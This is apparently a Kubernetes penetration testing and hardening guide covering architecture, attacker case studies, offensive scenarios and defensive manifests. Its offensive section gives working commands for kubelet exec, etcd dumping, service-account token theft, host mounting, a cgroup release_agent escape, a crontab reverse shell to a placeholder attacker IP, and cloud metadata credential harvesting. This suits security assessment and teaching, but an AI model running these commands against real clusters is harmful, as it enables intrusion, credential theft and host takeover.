# Kubernetes Penetration Testing & Security Assessment Guide

<img width="1678" height="937" alt="Kubernetes Hacking Guide_ Cat in Charge" src="https://github.com/user-attachments/assets/ee22bb51-5a99-4ed5-8ca6-dce9e1e8e1a0" />

## 1. Overview & Audience Requirements

This guide provides an end-to-end methodology for auditing, penetration testing, threat modeling, and hardening Kubernetes clusters and containerized workloads.

### Prerequisites & Expected Knowledge
To effectively execute the assessment procedures outlined in this guide, security practitioners should possess:
- Proficiency with **GNU/Linux** operating systems, kernel namespaces, cgroups, and capabilities.
- Deep understanding of **Network and Application Security** fundamentals (Layer 3 to Layer 7 protocols).
- Familiarity with core vulnerability management, exploit mechanisms, post-exploitation tactics, and lateral movement.
- Experience with cloud-native security standards (CIS Benchmarks, NSA-CISA Kubernetes Hardening Guidance, MITRE ATT&CK for Containers).

---

## 2. Fundamentals: Containers & Kubernetes Architecture

### 2.1 Container Execution Fundamentals
A container packages application code along with all runtime dependencies, configuration files, and system libraries into a standardized execution unit:
$$\text{Container} = \text{Code} + \text{Config} + \text{Dependencies} + \text{Runtime}$$

Containers operate using core Linux kernel features:
- **Namespaces**: Provide process isolation (`pid`, `net`, `mnt`, `ipc`, `uts`, `user`).
- **cgroups (Control Groups)**: Enforce resource limits (CPU, memory, disk I/O, network bandwidth).
- **Capabilities**: Divide root privilege into distinct capabilities (e.g., `CAP_NET_ADMIN`, `CAP_SYS_ADMIN`).

### 2.2 The 4Cs of Cloud-Native Security
Security in cloud-native infrastructure is layered across four distinct boundaries:
1. **Cloud**: Infrastructure security, IAM roles, metadata access controls, network VPCs.
2. **Cluster**: Kubernetes control plane API, RBAC policies, network policies, node security.
3. **Container**: Container runtime, base image vulnerabilities, security contexts, filesystem permissions.
4. **Code**: Application-level vulnerabilities, dependencies, secret exposure, secure coding standards.

```
       +-------------------------------------------------------+
       |                        CLOUD                          |
       |  +-------------------------------------------------+  |
       |  |                    CLUSTER                      |  |
       |  |  +-------------------------------------------+  |  |
       |  |  |                CONTAINER                  |  |  |
       |  |  |  +-------------------------------------+  |  |  |
       |  |  |  |               CODE                  |  |  |  |
       |  |  |  +-------------------------------------+  |  |  |
       |  |  +-------------------------------------------+  |  |
       |  +-------------------------------------------------+  |
       +-------------------------------------------------------+
```

### 2.3 Kubernetes Architecture
Kubernetes is an open-source orchestration system designed for automated deployment, scaling, and management of containerized workloads.

```
+-----------------------------------------------------------------------------------+
|                                Kubernetes Cluster                                 |
|                                                                                   |
|  +-------------------------------------+   +-----------------------------------+  |
|  |     Control Plane (Master Node)     |   |     Data Plane (Worker Nodes)     |  |
|  |                                     |   |                                   |  |
|  |  +----------+       +------------+  |   |  +-----------------------------+  |  |
|  |  |   etcd   | <---> | API Server |  | <---> | Kubelet   Container Runtime |  |  |
|  |  +----------+       +------------+  |   |  |            +----------+     |  |  |
|  |       ^                   ^         |   |  |            |  Pods    |     |  |  |
|  |       |                   |         |   |  |            +----------+     |  |  |
|  |  +----------+       +------------+  |   |  | kube-proxy                  |  |  |
|  |  |Scheduler |       | Controller |  |   |  +-----------------------------+  |  |
|  |  +----------+       +------------+  |   +-----------------------------------+  |  |
|  +-------------------------------------+                                          |
+-----------------------------------------------------------------------------------+
```

#### Core Components
- **Control Plane (Master Node)**:
  - **kube-apiserver**: The central management hub and gatekeeper exposing the Kubernetes REST API.
  - **etcd**: Consistent, highly-available key-value store holding all cluster state, configurations, and secrets.
  - **kube-scheduler**: Assigns newly created Pods to appropriate worker nodes based on resource limits and affinity rules.
  - **kube-controller-manager**: Runs controller loops regulating cluster state (e.g., ReplicaSets, Node lifecycle).
  - **cloud-controller-manager**: Links cluster logic with underlying cloud provider APIs (AWS, GCP, Azure).
- **Data Plane (Worker Nodes)**:
  - **kubelet**: Node-level agent ensuring specified containers are running healthily inside Pods.
  - **Container Runtime**: Executable engine managing container lifecycle (e.g., `containerd`, `CRI-O`).
  - **kube-proxy**: Network proxy managing network communication rules and service load balancing on nodes.

#### Key Resources
- **Pod**: Smallest deployable unit in Kubernetes, wrapping one or more co-located containers sharing network/storage namespaces.
- **ReplicaSet**: Guarantees a specified count of identical Pod replicas are active.
- **Deployment**: Declarative controller for Pods and ReplicaSets, facilitating zero-downtime updates and rollbacks.
- **ConfigMap**: Holds non-sensitive configuration data in key-value pairs.
- **Secret**: Stores sensitive data (e.g., API tokens, TLS keys). *Note: Base64-encoded by default; requires explicit KMS encryption at rest.*
- **Volume / PV / PVC**: Storage abstraction layer (**PersistentVolume** defines storage; **PersistentVolumeClaim** requests storage).
- **Ingress**: Manages external HTTP/HTTPS routing into internal cluster services.

---

## 3. Kubernetes Threat Model & Attack Surface

### 3.1 Threat Matrix

| Threat Dimension | Categories / Examples |
| :--- | :--- |
| **01. Attack Vectors** | • External Internet Attackers<br>• Internal Compromised Workloads / Pods<br>• Malicious or Compromised Developer / CI/CD Pipeline<br>• Insider Threat / Over-privileged Administrator<br>• End Users exploiting web application vulnerabilities |
| **02. Target Assets** | • Cluster State Store (`etcd`)<br>• Service Account Secrets & Cloud IAM Tokens<br>• Storage Volumes & Persistent Claims (Data Leakage)<br>• Container Registries (Malicious Image Injection)<br>• Node Compute Resources (Cryptojacking / Botnet Node) |
| **03. Attack Techniques** | • Exploiting Unauthenticated API Endpoints<br>• Container Escape to Host via Host Mounts or Privileged Mode<br>• RBAC Privilege Escalation (e.g., Pod Creation / Secret Reading)<br>• Egress Exfiltration to Malicious C2 Infrastructure<br>• Cloud Metadata Service Exfiltration (IMDS Harvest) |

### 3.2 Layered Attack Surface Breakdown

```
+-----------------------------------------------------------------------+
| 1. APPLICATION LAYER   | Web Vulnerabilities (SQLi, SSRF, RCE, LFI)    |
+-----------------------------------------------------------------------+
| 2. CONTROL PLANE LAYER | API Server, Kubelet, etcd, RBAC, Webhooks      |
+-----------------------------------------------------------------------+
| 3. RUNTIME LAYER       | Container Runtime (runc), cgroups, Kernel     |
+-----------------------------------------------------------------------+
| 4. NETWORK LAYER       | Pod-to-Pod Traffic, CNI Plugin, Ingress/Egress|
+-----------------------------------------------------------------------+
| 5. HOST / CLOUD LAYER  | Host OS, Cloud Metadata (IMDS), IAM Roles     |
+-----------------------------------------------------------------------+
```

---

## 4. Threat Intelligence Case Studies

### 4.1 Case Study 1: Kinsing Malware Group
The **Kinsing** actor routinely scans the internet targeting vulnerable cloud-native workloads and misconfigured container services to perform memory-resident cryptomining and lateral movement.

```
                              [Victim Server]
                             +-----------------------------------+
                             |  +-----------------------------+  |
[Kinsing Scan Server] ------>|  | 1. Vulnerable Workload      |  |
 (Scanning Internet)  (RCE)  |  |    (e.g., Openfire/Redis)   |  |
                             |  +--------------+--------------+  |
                             |                 |                 |
                             |                 v                 |
                             |  +-----------------------------+  |    [Kinsing Download Server]
                             |  | 2. Downloads Shell Script   |<----| (Shell scripts, Malware,
                             |  |    & Rootkit Payload        |  |    Cryptominer Rootkit)
                             |  +--------------+--------------+  |
                             |                 |                 |
                             |                 v                 |
                             |  +-----------------------------+  |
                             |  | 3. Memory-Resident Malware  |  |
                             |  +--------------+--------------+  |
                             |                 |                 |
                             |        +--------+--------+        |
                             |        |                 |        |
                             |        v                 v        |
                             |  +----------+      +-----------+  |
                             |  | 4. C2    |      | 5. Crypto |  |
                             |  |    Comm   |      |    miner  |  |
                             |  +----+-----+      +-----------+  |
                             +-------|---------------------------+
                                     v
                           [Kinsing C2 Server]
```

#### Exploited Vulnerabilities Reference

| Vulnerability / Reference | Description / Target Component |
| :--- | :--- |
| **Docker API Misconfiguration** | Unauthenticated Docker daemon engine endpoints exposed on TCP port 2375 |
| **Redis Server Misconfiguration** | Unauthenticated Redis service allowing cron job / SSH key write |
| **CVE-2020-25213** | WordPress File Manager Plugin Remote Code Execution |
| **CVE-2020-23814** | XXL-JOB Remote Code Execution |
| **CVE-2020-11651 / CVE-2020-11652** | SaltStack Authentication Bypass & Arbitrary Code Execution |
| **CVE-2019-3396** | Atlassian Confluence Widget Connector Macro Velocity Template Injection |
| **CVE-2019-0193** | Apache Solr DataImportHandler Remote Code Execution |
| **CVE-2018-20062** | NoneCMS ThinkPHP Remote Code Execution |
| **CVE-2017-15718** | Apache Hadoop YARN NodeManager Arbitrary Command Execution |
| **CVE-2017-11610** | Supervisord RCE via XML-RPC |
| **CVE-2017-9841** | PHPUnit Remote Code Execution |

---

### 4.2 Case Study 2: SCARLETEEL 2.0 (Container-to-Cloud Lateral Movement)
SCARLETEEL 2.0 illustrates how an initial container compromise can pivot into a full cloud account takeover.

```
 [Initial Entry]             [Local Pivot]            [Cloud Escalation]          [Persistence & Impact]
+-----------------+        +---------------+        +--------------------+      +------------------------+
| App Exploit     | -----> | Service Acct  | -----> | Query Cloud IMDS   | ---> | Create Admin IAM Keys  |
| (Jupyter / RCE) |        | Token Steal   |        | (169.254.169.254)  |      | Cryptomining Sprawl    |
+-----------------+        +---------------+        +--------------------+      | Data Exfiltration      |
                                                            |                   +------------------------+
                                                            v
                                                    +--------------------+
                                                    | Obtain AWS IAM     |
                                                    | Temporary Credentials|
                                                    +--------------------+
```

#### Execution Stages
1. **Initial Access**: Exploitation of a vulnerable public application (e.g., misconfigured Jupyter Notebook or web framework) inside a container.
2. **Reconnaissance**: Tool execution (`peirates`, `AWS CLI`, `pacu`) to detect execution context (EKS / ECS / Fargate).
3. **Credential Extraction**:
   - Reading mapped Service Account tokens from `/var/run/secrets/kubernetes.io/serviceaccount/token`.
   - Querying the Instance Metadata Service (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`) to capture temporary node IAM credentials.
4. **Cloud Escalation**: Utilizing captured IAM credentials to pivot from Kubernetes into the broader cloud environment, abusing weak IAM policies.
5. **Persistence**: Creating backdoored IAM users, generating persistent access keys, deploying rogue EC2 instances for cryptomining, and exfiltrating S3 buckets.

---

## 5. Offensive Penetration Testing Methodology & Scenarios

### 5.1 Scenario 1: External Control Plane Reconnaissance & Exploitation
Attackers query exposed Kubernetes control plane and node ports to check for unauthenticated access.

#### Step 1: Reconnaissance Port Scanning
```bash
nmap -p 6443,8080,10250,10255,2379,2380 -sV -T4 <TARGET-IP-OR-SUBNET>
```

#### Step 2: Testing Unauthenticated Kubelet API
If port `10250` allows anonymous access:
```bash
# List all pods running on the target node
curl -k -s https://<TARGET-IP>:10250/pods | jq .

# Execute command inside a running container via Kubelet API
curl -k -X POST "https://<TARGET-IP>:10250/exec/<namespace>/<pod-name>/<container-name>?command=id&command=whoami&output=1"
```

#### Step 3: Testing Unauthenticated etcd Access
If etcd port `2379` is publicly exposed without mTLS:
```bash
# Dump all keys (including plaintext secrets, tokens, and configs)
etcdctl --endpoints=http://<TARGET-IP>:2379 get "" --prefix=true --keys-only
```

---

### 5.2 Scenario 2: In-Pod Reconnaissance & Service Account Token Abuse
Once remote code execution is obtained within a container, the attacker inspects mounted tokens and environment variables.

#### Step 1: Environment & Token Inspection
```bash
# Check current user and capabilities
id
capsh --print

# Locate mounted Service Account credentials
cd /var/run/secrets/kubernetes.io/serviceaccount/
ls -la
cat token
cat namespace
cat ca.crt

# Set shell variable for ease of use
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
```

#### Step 2: Testing RBAC Permissions via API Server
```bash
# Query the Kubernetes API Server using the harvested JWT token
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/pods

# Test permissions with kubectl (if binary is available or uploaded)
kubectl --token=$TOKEN --server=https://kubernetes.default.svc auth can-i --list
```

#### Common High-Risk RBAC Misconfigurations:
- **`pods/exec` (create)**: Enables executing interactive commands inside other pods.
- **`pods` (create)**: Enables creating new arbitrary pods (vector for container breakout).
- **`secrets` (get/list)**: Allows reading sensitive credentials across namespaces.
- **`roles` / `clusterroles` (bind/escalate)**: Allows assigning elevated privileges to self or target service accounts.

---

### 5.3 Scenario 3: Container Breakouts (Escaping to the Host Node)

#### Breakout Vector A: Privileged Container Execution
If a container is started with `securityContext.privileged: true`, device nodes from the host are exposed inside the container.

```bash
# List host disk devices
fdisk -l

# Create mount point and mount the host root partition
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Chroot into host filesystem or access host files
chroot /mnt/host
cat /etc/shadow
```

#### Breakout Vector B: HostPath Mount Abuse
If the host root directory (`/`) or `/var/run/docker.sock` / `/run/containerd/containerd.sock` is mounted inside a non-privileged pod:

```bash
# Case 1: Host Root Directory Mounted at /host
cat /host/etc/crontab
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'" >> /host/etc/crontab

# Case 2: Docker Socket Mounted at /var/run/docker.sock
# Launch a privileged container that mounts host root
docker run -v /:/host -it ubuntu chroot /host
```

#### Breakout Vector C: Capability Abuse (`CAP_SYS_ADMIN`)
If `CAP_SYS_ADMIN` is enabled, the container can abuse `cgroups` release_agent functionality to execute commands on the host:

```bash
# Create cgroup release_agent exploit trigger
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
HOST_PATH=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$HOST_PATH/cmd" > /tmp/cgrp/release_agent

# Write exploit payload to execute on host
echo '#!/bin/sh' > /cmd
echo 'ps aux > '$HOST_PATH'/output' >> /cmd
chmod +x /cmd

# Trigger execution on host
sh -c "echo 0 > /tmp/cgrp/x/cgroup.procs"
cat /output
```

---

### 5.4 Scenario 4: Cloud Metadata Service (IMDS) Credential Harvesting
From inside a container on AWS (EKS), GCP (GKE), or Azure (AKS), check for metadata endpoint access:

```bash
# AWS IMDSv1 Query (If IMDSv2 is not enforced)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# AWS IMDSv2 Query
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP Metadata Query
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure Metadata Query
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=218-02-01&resource=https://management.azure.com/"
```

---

## 6. Defensive Controls, Hardening & Governance

### 6.1 Pod Security Standards (PSS)
Kubernetes defines three built-in security levels:
1. **Privileged**: Unrestricted permissions (intended for system-level pods).
2. **Baseline**: Minimally restrictive policy preventing known privilege escalations.
3. **Restricted**: Best-practice hardening enforcing non-root, dropping capabilities, read-only rootfs.

#### Enforcing PSS via Namespace Labels
```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: secure-workloads
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: latest
```

#### Secure Workload Manifest Example
```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: secure-app
  namespace: secure-workloads
spec:
  replicas: 2
  selector:
    matchLabels:
      app: secure-app
  template:
    metadata:
      labels:
        app: secure-app
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 10001
        runAsGroup: 10001
        fsGroup: 10001
        seccompProfile:
          type: RuntimeDefault
      containers:
        - name: web
          image: myregistry.com/app:v1.2.0
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop:
                - ALL
          resources:
            limits:
              cpu: "500m"
              memory: "512Mi"
            requests:
              cpu: "100m"
              memory: "128Mi"
```

---

### 6.2 Admission Control with Open Policy Agent (OPA) Gatekeeper
OPA Gatekeeper intercept API requests post-authentication to validate declarative policies.

#### Example: Allowed Container Registries Policy (`constraint.yaml`)

```yaml
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sAllowedRepos
metadata:
  name: repo-constraint
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
    namespaces:
      - "default"
  parameters:
    repos:
      - "openpolicyagent/"
      - "myregistry.com/"
```

#### Verification Behavior
```bash
$ kubectl run untrusted-pod --image=nginx:latest
Error from server (Forbidden): admission webhook "validation.gatekeeper.sh" denied the request: 
[repo-constraint] container <untrusted-pod> has an invalid image repo <nginx:latest>, allowed repos are ["openpolicyagent/", "myregistry.com/"]
```

---

### 6.3 Network Policy Micro-Segmentation
By default, Kubernetes uses an unrestricted flat network: **all Pods communicate with all other Pods**. Network Policies enforce isolation rules.

```
Outside Cluster Traffic                    Kubernetes Cluster
+---------------------+                   +-------------------+
|  All endpoints      | -- Blocked ------>|                   |
|  Port 80,443        | -- Allowed -----> | Namespace         |
+---------------------+                   | 'Default'         |
                                          |                   |
Internal Namespace                        | Ingress / Egress  |
+---------------------+                   | Default Deny      |
| Any Pod app=web     | -- Allowed -----> |                   |
| Ingress Port 80,443 |                   |                   |
+---------------------+                   +---------+---------+
                                                    |
                                                    v
                                      Egress Port 53 (DNS) Allowed
```

#### Manifest: Default Deny All with Selective Ingress/Egress Allowance

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: production
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-web-to-db
  namespace: production
spec:
  podSelector:
    matchLabels:
      role: database
  ingress:
  - from:
    - podSelector:
        matchLabels:
          role: frontend
    ports:
    - protocol: TCP
      port: 5432
  egress:
  - to:
    - namespaceSelector: {}
    ports:
    - protocol: UDP
      port: 53
```

---

### 6.4 Secrets Management & HashiCorp Vault KMS Integration
Kubernetes secrets stored in `etcd` are Base64 strings. Encrypt them using KMS integration:

```
+---------------+      Encrypt using Transit Key      +-------------------+
|               | ----------------------------------> | HashiCorp Vault   |
|               | <---------------------------------- | KMS Server        |
|  Kubernetes   |          Return Ciphertext          +-------------------+
| Control Plane |
|               |      Send Encryption Request        +-------------------+
| (kube-api)    | <---------------------------------> | vault-k8s-kms     |
|               |                                     +-------------------+
|               |      Store Encrypted Response       +-------------------+
|               | ----------------------------------> | etcd              |
+---------------+                                     +-------------------+
```

#### Hardening Rules:
1. Enable `--encryption-provider-config` on `kube-apiserver` pointing to an external KMS provider.
2. Avoid storing plaintext secrets in Git repositories; use External Secrets Operator or HashiCorp Vault Agent sidecars.

---

### 6.5 Control Plane Port Matrix & Audit Reference

| Protocol | Direction | Port Range | Service / Component | Audit Recommendation |
| :--- | :--- | :--- | :--- | :--- |
| **TCP** | Inbound | `6443` | Kubernetes API Server | Require TLS 1.3, strong auth, restrict IP access via firewall. |
| **TCP** | Inbound | `8080` | Insecure API Server Port | **MUST BE DISABLED** (`--insecure-port=0`). |
| **TCP** | Inbound | `2379`, `2380` | etcd Server Client API / Peer | Require mTLS (`--client-cert-auth=true`); restrict strictly to API server IPs. |
| **TCP** | Inbound | `10250` | Kubelet API | Set `--anonymous-auth=false` and `--authorization-mode=Webhook`. |
| **TCP** | Inbound | `10259` | kube-scheduler | Bind to localhost (`127.0.0.1`). |
| **TCP** | Inbound | `10257` | kube-controller-manager | Bind to localhost (`127.0.0.1`). |
| **TCP** | Inbound | `30000-32767` | NodePort Services | Audit NodePort exposures; favor Ingress with WAF. |

---

## 7. Security Tooling Breakdown & Matrix

```
                            Kubernetes Security Tooling
                                         |
     +--------------------+--------------+--------------+--------------------+
     |                    |                             |                    |
     v                    v                             v                    v
[Container & IaC]    [Cluster Benchmarking]       [Offensive Testing]   [RBAC Analysis]
- Trivy              - Kube-bench                 - Kube-hunter         - Kubiscan
- Grype              - Kubescape                  - Kubesploit          - Kubeaudit
- KICS               - Kubesec                    - Peirates
- Checkov            - Kubescore
```

### Comprehensive Tooling Table

| Category | Tool Name | Scope / Function | Target Audience |
| :--- | :--- | :--- | :--- |
| **Container & IaC Scanning** | `Trivy` | Scans container images, filesystems, and IaC for CVEs and misconfigurations. | DevSecOps / Testers |
| **Container & IaC Scanning** | `Checkov` | Static code analysis tool for Infrastructure as Code (Terraform, Helm, K8s). | Developers / Auditors |
| **Benchmarking & Compliance** | `kube-bench` | Runs CIS Kubernetes Benchmark checks directly on nodes. | Security Auditors |
| **Benchmarking & Compliance** | `Kubescape` | Evaluates cluster risks against NSA-CISA guidance and MITRE ATT&CK framework. | SecOps / Auditors |
| **RBAC Analysis** | `Kubiscan` | Identifies risky RBAC permissions, role bindings, and privilege escalation paths. | Penetration Testers |
| **RBAC Analysis** | `kubeaudit` | Audits runtime workloads for missing security contexts and capabilities. | Cluster Admins |
| **Offensive Exploitation** | `kube-hunter` | Scans clusters for known vulnerabilities and open control plane ports. | Red Teams / Testers |
| **Offensive Exploitation** | `peirates` | Automated Kubernetes API exploitation framework for post-exploitation. | Red Teams |

---

## 8. Master Penetration Testing Execution Checklist

### Phase 1: Reconnaissance & Discovery
- [ ] Scan cluster network ranges for open ports (`6443`, `8080`, `10250`, `2379`, `30000-32767`).
- [ ] Check if `kube-apiserver` allows unauthenticated requests (`curl -k https://<IP>:6443/api/v1/namespaces`).
- [ ] Test Kubelet API for anonymous user execution (`curl -k https://<IP>:10250/pods`).
- [ ] Test etcd for unauthenticated access on TCP port `2379`.
- [ ] Verify if Kubernetes Dashboard is exposed publicly without authentication.

### Phase 2: In-Pod Enumeration & Initial Access
- [ ] Extract mounted Service Account token (`/var/run/secrets/kubernetes.io/serviceaccount/token`).
- [ ] Run `kubectl auth can-i --list` using extracted service account tokens.
- [ ] Check container environment variables for database credentials or API keys.
- [ ] Query Cloud Metadata Service (`169.254.169.254`) to extract cloud provider IAM credentials.

### Phase 3: Privilege Escalation & Container Escape
- [ ] Audit container capabilities (`capsh --print`). Check for `CAP_SYS_ADMIN`, `CAP_NET_ADMIN`, `CAP_SYS_PTRACE`.
- [ ] Check if pod is running with `privileged: true`.
- [ ] Verify mounted volumes for dangerous host paths (`/`, `/var/run/docker.sock`, `/etc`).
- [ ] Check if pod shares host namespaces (`hostPID: true`, `hostNetwork: true`, `hostIPC: true`).
- [ ] Attempt container escape payloads if host mounts or dangerous capabilities exist.

### Phase 4: Lateral Movement & Cluster Takeover
- [ ] Test RBAC permissions for secret harvesting (`kubectl get secrets --all-namespaces`).
- [ ] Attempt creating a privileged pod mapped to the node root filesystem to obtain node shell access.
- [ ] Test node-to-node communication to check if Network Policies are enforcing isolation.
- [ ] Attempt abusing `pods/exec` permissions to hop into pods in other namespaces.
- [ ] Access `etcd` to retrieve cluster master CA certificates and service account signing keys.

---
```
eof
